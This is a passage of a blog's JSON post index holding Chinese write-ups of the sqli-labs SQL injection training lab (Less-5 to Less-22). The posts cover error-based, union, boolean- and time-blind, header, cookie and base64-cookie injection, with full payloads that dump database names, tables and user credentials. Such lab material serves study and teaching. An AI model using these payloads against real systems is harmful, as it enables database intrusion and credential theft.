(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),0x7e)) and &#39;1&#39; &#x3D;&#39;1\n\nReferer: &#39; or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 5,1),0x7e)) and &#39;1&#39; &#x3D;&#39;1\n\n爆内容：\nReferer: &#39; or extractvalue(1,concat(0x7e,(select concat(username,&#39;:&#39;,password) from users limit 0,1),0x7e)) and &#39;1&#39; &#x3D;&#39;1\n\n\n0x01（Cookie注入）Less-20\n从源码分析如下：\n\n\n $_COOKIE接收到username的值后将会带入数据库查询，从这可以进行注入。\n0x02首先进行正常输入admin和admin看一下回显页面：\n根据以上分析在cookie进行报错注入。\n\n0x03记录一下踩得坑：\n这里抓包之后添加Cookie：uname=admin后使用POST方式提交的话返回异常回显：\n该成GET方式提交回显正常：\n\n爆库名：\nCookie: uname&#x3D;admin&#39; or extractvalue(1,concat(0x7e,(select database()),0x7e))#\n\n\n后续过程与Less-19相同，同样也可以使用其他注入。\n\n##0x01（Cookie注入-base64）\n从源码分析得知，与Less-20不同的是，Less-21对uname字段进行了base64加密：\n\n\n\n这里其实是：$_COOKIE获取到uname字段的内容后先进行了base64_encode，提交表单之后又进行了base64_decode，最后将解密后的cookie代入数据库查询，最后又进行了base64_encode。由此可知，在注入的时候要先要进行一次base64_encode，思路大概就是这样。\n这里还需注意一个点：此处的cookie值进行了&#39;)处理，导致开始注入的时候老是报语法错误。\n0x02先抓包，然后进行cookie加密注入：\n探测一下字段数，有3个字段：\nCookie: uname&#x3D;YWRtaW4nKSBvcmRlciBieSA0Iw&#x3D;&#x3D;\n\n\n联合注入爆库，爆版本号：\nCookie: uname&#x3D;LWFkbWluJykgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSx2ZXJzaW9uKCkj\n\n\n爆表名：\nCookie: uname&#x3D;LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIw&#x3D;&#x3D;\n\n\n爆字段：\nCookie: uname&#x3D;LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnIw&#x3D;&#x3D;\n\n\n爆内容：\nuname&#x3D;LWFkbWluJykgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9jb25jYXQocGFzc3dvcmQpIGZyb20gc2VjdXJpdHkudXNlcnMj\n\n\nLess-21最关键的就在于base64加解密的注入。\n0x01（Cookie注入）Less-22\n这里只有编码注入的时候注意&quot;就OK：\n\n其他payload与Less-21相同。\n","slug":"POST注入-HTTP头注入","date":"2022-02-05T13:27:35.000Z","categories_index":"SQL注入","tags_index":"SQL注入","author_index":"Aurora"},{"id":"9ed0d530657a494b586000f6c049b35e","title":"POST注入--基于Password的注入","content":"[TOC]\nLess-17说实话，看到的时候挺吃惊的，没见过，试了很多payload，都注不进去，它还嘲讽我：\n\n0x01查了一下资料，又看了一下源码发现username已经不能被注入了，原因是源码将uname字段进行了检查，导致uname不能够构造payload进行注入。\n（check_input()中，对 username 进行各种转义的处理）\n\n\n源码当中还遇到update进行了密码更新，以至于passwd字段可以进行构造payload：\n\n0x02而执行以下语句时报错：\nuname&#x3D;admin  &amp;passwd&#x3D;1&#39;\n\n\n探测注入点：\nuname&#x3D;admin  &amp;passwd&#x3D;1&#39; or 1&#x3D;1 #\n\n登录成功。\n\n0x03在passwd处构造payload进行报错注入：\nuname&#x3D;admin  &amp;passwd&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select database()),0x7e)) #\n\n\n其他payload类似。\n0x04这里还需要注意其他几个函数：\n1、增加一行数据：Insert\n例：insert into users values(‘15’,’xiaobai’,’xiaobai’);\n\n2、delete：\n删除：\n删数据: \ndelete from 表名; \ndelete from 表名 where id&#x3D;1; \n删除结构： \n删数据库：drop database 数据库名; \n删除表：drop table 表名; \n删除表中的列:alter table 表名 drop column列名;\n例：delete from users where id&#x3D;15；\n\n\n3、update：修改\n修改所有：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ ;\n带条件的修改：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ where id&#x3D;6\n例：update users set username&#x3D;’tt’ where id&#x3D;15;\n","slug":"POST注入-基于Password的注入","date":"2022-02-05T05:45:34.000Z","categories_index":"SQL注入","tags_index":"SQL注入","author_index":"Aurora"},{"id":"32164fb6c436bfef89c97f001eea26bc","title":"SQL注入-POST注入","content":"[TOC]\n0x00POST注入，就是数据从客户端提交 到服务器端，例如我们在登录过程中，输入用户名和密码，用户名\n和密码以表单的形式提交， 提交到服务器后服务器再进行验证。这就是一次 post的过程。\nLess-11当在输入框输入正确的用户名和密码后，显示登录成功\n\n0x01接下来就要探测注入点：\n当输入admin&#39; --+ 123,出现以下报错，可得知单引号报错；\n\n注入以下语句：\nadmin&#39; or &#39;1&#39;&#x3D;&#39;1 --+\n123（密码随意）\n\n登录正常。\n\n0x02猜解字段数：\n执行以下语句：\nadmin&#39; order by 3 #\nsss（密码随意）\n\n出现报错\n\nadmin&#39; order by 2 #\n123\n\n登录正常，有两个字段\n\n0x03判断回显点：\n-admin&#39; union select 1,2#\n\n\n0x04爆库名：\n-admin&#39; union select 1,database() #\n\n\n后续注入同GET方式的payload。\nLess-12输入admin&quot;出现报错，基于&quot;)的报错\n\n同样，类似Less-11探测注入点：\nuname&#x3D;admin&quot;) or 1&#x3D;1 #&amp;passwd&#x3D;\n\n登录成功\n\n探测字段数：\nuname&#x3D;admin&quot;)  order by 2 #&amp;passwd&#x3D;\n\n\n探测回显点：\nuname&#x3D;-admin&quot;)  union select  1,2 #&amp;passwd&#x3D;\n\n使用union字段一定要将开始查询的字段报错：-admin&quot;)\n\n后续过程同以往payload。\nLess-13输入admin&#39;出现报错，基于&#39;)的报错\n\n探测注入点：\nuname&#x3D;admin&#39;) or 1&#x3D;1#&amp;passwd&#x3D;\n\n登录成功，无回显。\n\n在探测回显点时，注入：\nuname&#x3D;admin&#39;)  union select 1,2#&amp;passwd&#x3D;\n\n同样无回显：\n\n这时候首先想到的是盲注，先用报错盲注试验一下：\nuname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select database()),0x7e),1)#&amp;passwd&#x3D;\n\n果然，爆出数据库。\n\n爆表名：\nuname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),0x7e),1)#&amp;passwd&#x3D;\n\n\n爆字段：\nuname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),0x7e),1)#&amp;passwd&#x3D;\n\nuname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 5,1),0x7e),1)#&amp;passwd&#x3D;\n\n爆内容：\nuname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select concat(username,&#39;:&#39;,password) from users limit 0,1),0x7e),1)#&amp;passwd&#x3D;\n\n这里还可以使用其他的盲注进行测试。其他的payload见Less-5。\nLess-14输入admin&quot;,报错，对id进行了&quot;处理\n\n探测注入点：\nuname&#x3D;admin&quot; or 1&#x3D;1 #&amp;passwd&#x3D;\n\n登录成功，同样无回显。\n\n这里应该和Less-13一样，同样都是盲注：\nuname&#x3D;admin&quot; union select count(*),concat((select database()),floor(rand()*2)) a from information_schema.schemata  group by a #&amp;passwd&#x3D;\n\n使用floor()函数报错，爆出数据库\n\nuname&#x3D;admin&quot; or if(length(version())&gt;6, 1, sleep(5)) #&amp;passwd&#x3D;\n\n时间盲注，猜测版本号，等待响应，版本号不大于6\n\n其他payload同以往。\n##Less-15\n输入admin&#39;登录失败 ，输入admin&#39; or 1=1#登录成功，但都无回显，无报错，结合源代码，这里对于id进行了&#39;处理，试验报错盲注，发现没有任何变化 ，而且还是登录失败的界面：\nuname&#x3D;admin&#39; or updatexml(1,concat(0x7e,select database(),0x7e),1)   #&amp;passwd&#x3D;\n\n\n报错盲注应该在这里不行，试试盲注。\nuname&#x3D;admin&#39; or if(length(version())&gt;5,1,sleep(5)) #&amp;passwd&#x3D;\n\n时间盲注探测数据库版本，回显登录正确；\n\nuname&#x3D;admin&#39; or ascii(substr(database(),1,1))&#x3D;115 #&amp;passwd&#x3D;\n\n布尔盲注探测数据库第一位字符，回显登录正确。\n\n其他payload见以往。\nLess-16根据源码，这里对id进行了&quot;)的处理，其他payload与Less-15相同。\n","slug":"SQL注入-POST注入","date":"2022-02-05T01:25:13.000Z","categories_index":"SQL注入","tags_index":"SQL注入","author_index":"Aurora"},{"id":"7e9ef5437654636a3aa94a45e71b7622","title":"SQL注入-Less8-Less10","content":"[TOC]\n0x00记录一下Less-8—Less10盲注遇到的一些问题\n0x01首先8-10关最大特点就是没有报错回显，导致开始注入的时候都是利用报错注入，结果统统失败，后来查看源码发现，报错回显被注释掉了，那这几关报错盲注就不能用了，只能用布尔盲注和时间盲注。\n\n0x02其次就是注入点的问题，Less-8是单引号的布尔盲注，Less-9是单引号的时间盲注，Less-10是双引号的时间盲注，每次注入的时候探测注入很关键，这也是每次注入的时候我老是忽略的问题。\n0x03然后就是对于布尔盲注和时间盲注时，猜表名和猜列名遇到的问题；由于猜表名的时候根据以往的回显表示：子查询超过一行的报错，以至于这几关每次注入的时候老是缺少limit字段，而且又是盲注的无回显，导致每次出问题都不知道在哪里，仔细一看才知道没加limit字段。\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 1,1),1,1))&#x3D;116,1,sleep(5)) --+\n\n\n\n0x04Less-9和Less-10最大的特点就是：时间盲注的时候，不管怎么注入都只出现You are in………..，但是浏览器会响应，如图：\n\n看到等待sqli-labs-master的响应…才明白sleep()函数被执行了，但页面会保持不变。\n0x05sqli-labs的前十关都是基于GET方式的注入。\n","slug":"SQL注入-Less8-Less10","date":"2022-02-03T16:35:17.000Z","categories_index":"SQL注入","tags_index":"SQL注入,靶场","author_index":"Aurora"},{"id":"b9f032fc8c8fc6510bd3ac95f6665bcd","title":"盲注-SQL靶场","content":"[TOC]\n0x00Less-5和Less-6关看了很多文章，总的下来就是布尔盲注，报错注入和时间盲注，通过各种函数进行注入，在这里记录以下。\n0x01（floor()报错）首先，开始注入的时候先是按照1-4关的注入方式探测了以下注入点，又看了一下源码，发现源码当中只能输出You are in……….\n\n这时候才发现1-4关的注入方式已经在5关用不了了。\n但这里还是可以判断出字段数的：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; order by 3--+\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; order by 4--+\n\n根据回显，正确时就会返回You are in……….，错误时返回空。\n\n\n0x02开始注入以下语句：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select database()),floor(rand()*2)) as  a from information_schema.schemata group by a --+\n\n第一次点击，回显正常页面\n\n第二次点击，爆出数据库（对于这样的情况需要多点击几次才能得到回显）\n\n\n这里解析以下以上注入语句：\nselect database()：查询数据库\nfloor(rand()*2)：输出0或1\nconcat((select database()),floor(rand()*2))：将查询到的数据库与取整的0或1拼接，如上图\na：这里的a是将concat((select database()),floor(rand()*2))取的别名，得到的结果是a，此时的a有security0或security1两种情况，如上图\ngroup by：最后由group by函数将a进行分组，security0一组，security1一组\nfloor()函数报错分析：\n　 因为 rand 函数的特殊性（如果使用rand()的话，该值会被计算多次）。　 在这里的意思就是，group by 进行分组时，floor(rand(0)*2)执行一次（查看分组是否存在），如果虚拟表中不在在该分组，那么在插入新分组的时候 floor(rand(0)*2) 就又计算了一次。\n　　当我们使用floor(rand(0)*2)产生0和1两个随机数后，当在group by 对其进行分组的时候，首先遇到第一个值 0 ，发现 0 不存在，于是需要插入分组，就在这时，floor(rand(0)\\*2)再次被触发，生成第二个值 1 ，因此最终插入虚拟表的也就是第二个值 1 ；然后遇到第三个值 1 ，因为已经存在分组 1 了，就直接计数加1（这时1的计数变为2）;遇到第四个值 0 的时候，发现 0 不存在，于是又需要插入新分组，然后floor(rand(0)*2)又被触发，生成第五个值 1 ，因此这时还是往虚拟表里插入分组 1 ，但是，分组 1 已经存在了！所以报错！\n0x03接下来爆版本号：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select version()),floor(rand()*2)) as  a from information_schema.schemata group by a --+\n\n\n0x04爆数据库用户名：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select user()),floor(rand()*2)) as  a from information_schema.schemata group by a --+\n\n\n0x05这里爆表名的时候出现了错误：\nSubquery returns more than 1 row  子查询返回数据超过1行\n其实就是子查询返回数据时只能返回一条数据，但由于这里注入返回的结果超过了一行导致报错\n\n\n注到这里，看了一下解决Subquery returns more than 1 row的办法，用limit字段限制多余查询\nlimit语法：limit M,N 是从第M+1条数据开始查询，查询出N条数据。\n注入语句：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+\n\n这里一定要在子查询后面添加limit 0,1,如：\nconcat((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1 ),floor(rand()*2))\n\n\n0x06爆出所有表名：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+\n\n\n0x07爆所有字段：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1 ),floor(rand()*2)) as  a from information_schema.columns  group by a --+\n\n\n0x08这里要爆用户名的时候同样用了爆列名时候的group_concat()函数，但试了很多次，没有回显用户名数据，只有You are in……….\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select group_concat(username) from users limit 0,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+\n\n\n以至于改成下面的注入语句：\n不过这里只能通过控制limit字段来爆出用户名和密码\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select concat(username, &#39;:&#39;,password,&#39;;&#39;) from users limit 0,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+\n\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select concat(username,&#39;:&#39;,password,&#39;;&#39;) from users limit 1,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+\n\n以此类推。\n\n\n0x01（无回显的布尔）探测数据库版本是否&gt;&#x3D;5，回显正常，数据库版本在5.0以上\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(version(),1)&gt;&#x3D;5 --+\n\n\n0x02利用length()函数探测数据库长度：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;10 --+\n\n页面错误，表示数据库长度不是10。\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;8 --+\n\n此时回显正常，数据库长度为8。\n\n0x03猜测数据库名第一位：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(database(),1)&gt;&#39;a&#39;--+\n\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(database(),1)&gt;&#39;s&#39;--+\n\n\n若数据库第一位大于a返回正常，如图1；若数据库第一位不大于s则返回异常，通常这样的情况需要从a~z每一个去判断，若回显异常，则就是数据库第一位字符。\n得知第一位是s，猜第二位，这里判断前两位是否大于sa即可：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(database(),2)&gt;&#39;sa&#39;--+\n\n这里回显正常，表示第二位大于a\n\n从a开始一个一个去试，发现到e的时候回显异常，证明第二位字符是e。\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(database(),2)&gt;&#39;se&#39;--+\n\n\n剩下的字符根据得出的数据库的长度依次去猜每一位字符（这里可以写一个脚本去跑）\n0x04利用ascii()和substr()函数猜测表名：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;100 --+\n\n这里第一个表的第一个字符的ascii码&gt;100，回显正确\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;101 --+\n\n大于101时回显错误，根据acsii码表可知，101是e，所以第一张表的第一个字符是e。\n（在实战当中，应该从a&#x3D;97开始猜测，一个一个去试）\n\n第二个字符通过substr(**,2,1)进行猜测，剩下的字符以此类推。\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),2,1))&gt;108 --+\n\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),2,1))&gt;109 --+\n\n\n\n获取剩下的表：\n上述的语句中使用的 limit 0,1； 意思就是从第 0 个开始，获取第一个。那要获取第二个就是limit 1,1\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1,1))&gt;113 --+\n\n页面返回正常，表示第二张表的第一个字符&gt;113\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1,1))&gt;114 --+\n\n不大于114，证明第二张表的第一个字符是r，以后的过程就是不断的重复上面的。\n\n0x05利用 regexp 获取users表中的列：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^u[a-z]&#39; limit 0,1) --+\n\n页面回显正常，判断出users表中有u开头的字段\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^w[a-z]&#39; limit 0,1) --+\n\n若无字符开头的字段，回显异常，如图：\n\n依次进行正表达式猜列的字段名：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^username&#39; limit 0,1) --+\n\n猜测出字段名后要判断是否正确，直接判断 table_name &#x3D; ‘username’即可 。 \npassword字段同理。\n\n表达式更换如下：\n‘^n[a-z]’ -&gt; ‘^ne[a-z]’ -&gt; ‘^new[a-z]’ -&gt; ‘^news[a-z]’ -&gt; FALSE\n（在更换到’^news[a-z]’这步时会报错，此时写news即可。）\n0x06利用 ord()和 mid()函数获取 users表的内容\nIFNULL() 函数：用于判断第一个表达式是否为 NULL，如果为 NULL 则返回第二个参数的值，如果不为 NULL 则返回第一个参数的值。IFNULL(expression, alt_value)\nCAST()函数：用于将某种数据类型的表达式显式转换为另一种数据类型。CAST()函数的参数是一个表达式，它包括用AS关键字分隔的源值和目标数据类型。\ncast(username as char)：表示将username表达式转换为char类型。\nORD()：返回第一个字符的ASCII码。\nORDER BY 关键字默认按照升序对记录进行排序。\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))&#x3D;68--+\n\n结果返回正常，证明username字段中第一个用户名的第一个字符是D；接下来重复造轮子即可。\n\nord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))&#x3D;68 \n\n代码解析：先从users表中查询到username字段，然后执行cast(username as char)，将字段username转换为char类型，如果没有username字段，ifnull()函数将返回0x20（这里如果返回0x20已经没什么意义了，不需要继续了），按照id升序的方式排列，之后执行mid()函数，将查询到的用户名从第1位开始截取长度为1的字符，然后在执行ord()函数，将截取的字符转换为acsii码与68进行比较。此处的0x20是十六进制的ascii，表示空格\n\n0x01（XPATH函数报错）###updatexml(XML_document, XPath_string, new_value)\nXML_document：是文档对象的名称\nXPath_string：是XPath格式的字符串（如果XPath_string不是XPath格式，则会报错并显示出XPath_string的值）\nnew_value：替换查找到的数据\nXPath语法介绍:https://blog.csdn.net/dearbaba_8520/article/details/81557827\n常用注入语句：\nupdatexml(1,concat(1,payload),1)。\n\nconcat()函数用于将多个字符串连接成一个字符串,目的是让拼接后的字符串不符合XPath格式使其报错,显示出要查的对象。\n最终的目的是使其报错，至于拼接的值多种多样，并不局限于1。\n如图：\n\n0x02注入语句：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) --+\n\n这里的0x7eASCII是~,updatexml()报错信息为特殊字符，字母及之后的内容，为了前面字母丢失，开头连接一个特殊字符~。（并不局限于0x7e）\n\n0x03爆版本号：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select version()),0x7e),1) --+\n\n\n爆数据库：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+\n\n爆表名：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),0x7e),1) --+\n\n爆列名：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),0x7e),1) --+\n\n\n爆列名的时候用group_concat()函数没有爆出关键字段，这里需要控制limit 0,1爆出关键字段。\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),0x7e),1) --+\n\n爆出用户名：\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 5,1),0x7e),1) --+\n\n爆出密码：\n\n爆内容：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select concat(username,&#39;:&#39;,password) from users limit 0,1),0x7e),1) --+\n\n这里同样需要控制limit字段爆出信息\n\n\nextractvalue()：从目标XML中返回包含所查询值的字符串。　　EXTRACTVALUE (XML_document, XPath_string);\n　　第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc\n　　第二个参数：XPath_string (Xpath格式的字符串)\npayloaod:\nand extractvalue(0x7e,concat(0x7e,(select @version()),0x7e));\n\nextractvalue注入的原理：依旧如同updatexml一样，extract的第二个参数要求是xpath格式字符串，而我们输入的并不是。所以报错\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+\n\n\n后续过程如updatexml()相同。\n\n0x01（时间盲注）对于时间盲注，根据浏览器的反应，来猜测出数据库名，其实时间注入就是比布尔盲注多了一个if函数，sleep()函数就相当于布尔盲注中的true或false，其他语句大致都相同。\nsleep()函数http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if(length(database())&gt;9,1,sleep(10)) --+\n\nif(condition,true,false)&#x2F;若条件为真 返回true，若条件为假 返回false\n这里执行失败的话将睡10s。\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if(length(database())&gt;6,1,sleep(5)) --+\n\n执行成功则会迅速返回结果。\n\n爆数据库名：\n?id&#x3D;1&quot; and if((ascii(substr(database(),1,1)))&gt;120,1,sleep(10))--+\n\n爆表名：\n?id&#x3D;1&quot; and if((ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)))&gt;120,1,sleep(10))--+\n\n爆列名：\n?id&#x3D;1&quot; and if((ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1,1))))&gt;100,1,sleep(10))--+\n\n爆值：\n?id&#x3D;1&quot; and  if((ascii(substr(( select username from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+  \n\n?id&#x3D;1&quot; and  if((ascii(substr(( select password from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+  \n\n还是写个脚本跑一下方便啊！手工注效率低还容易出错啊！\n\nLess-6第六关根据源码判断出，双引号报错：\n$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;\n$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;\n\n\n这一关的注入方式和第五关相同，只需要将 &#39; 变为 &quot; 即可\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-6&#x2F;?id&#x3D;1&quot; union select 1,count(*),concat((select database()),floor(rand()*2)) a from information_schema.schemata  group by a--+\n\n\n后续过程同Less-5。\n","slug":"盲注-SQL靶场","date":"2022-02-02T12:12:53.000Z","categories_index":"SQL注入","tags_index":"SQL注入,靶场","author_index":"Aurora"},{"id":"db9d897023f4869df00e643d24440891","title":"SQL注入-盲注","content":"SQL盲注概述盲注，通俗易懂一点，就是在页面没有提供明显信息的情况执行的注入方式。\n1.如果数据库运行返回结果时只反馈对错不会返回数据库中的信息 此时可以采用逻辑判断是否正确的          盲注来获取信息。2.盲注是不能通过直接显示的途径来获取数据库数据的方法。\n盲注的分类1、布尔盲注\n2、时间盲注\n3、报错型盲注\nSQL盲注常用的函数1、length()：返回字符串的长度\n2、substr(string,start,length)：\n\nsubstr中的pos从1开始计数\nsubstr中的len把当前位置当作第一个\n\n（第一个参数string为要处理的字符串，start为开始位置，length为截取的长度）\n如图：截取字符串’abcde’，从第二个位置开始，截取长度为1的子串，为b。\n\n举例：\n(1) substr(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。\n(2) substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema&#x3D;0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处string参数可以为sql语句，可自行构造sql语句进行注入。\n3、mid():用法与substr()完全相同。\n举例：\n（1）MID(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。\n（2）MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema&#x3D;0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。\n4、ascii()：查询ascii码中对应的值：\n\n5、count()：统计记录的数量：\n\n\n6、if(condition,a,b)：如果condition为true,返回a,否则返回b\n\n7、sleep()：延迟几秒\n\n8、left()：得到字符串左部指定个数的字符\nleft(string,n)：string为要截取的字符串，n为长度\n举例：\n(1) left(database(),1)&gt;’a’,查看数据库名第一位，left(database(),2)&gt;’ab’,查看数据库名前二位。\n(2) 同样的string可以为自行构造的sql语句。\n9、ORD()：返回第一个字符的ASCII码，经常与上面的函数进行组合使用。\n例如：\nORD(MID(DATABASE(),1,1))&gt;114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’\n10、regexp 正则注入：\n\n当正确的时候显示结果为 1，不正确的时候显示结果为0。\n示例介绍：\n I select * from users where id&#x3D;1 and 1&#x3D;(if((user() regexp &#39;^r&#39;),1,0)); \n\nII select * from users where id&#x3D;1 and 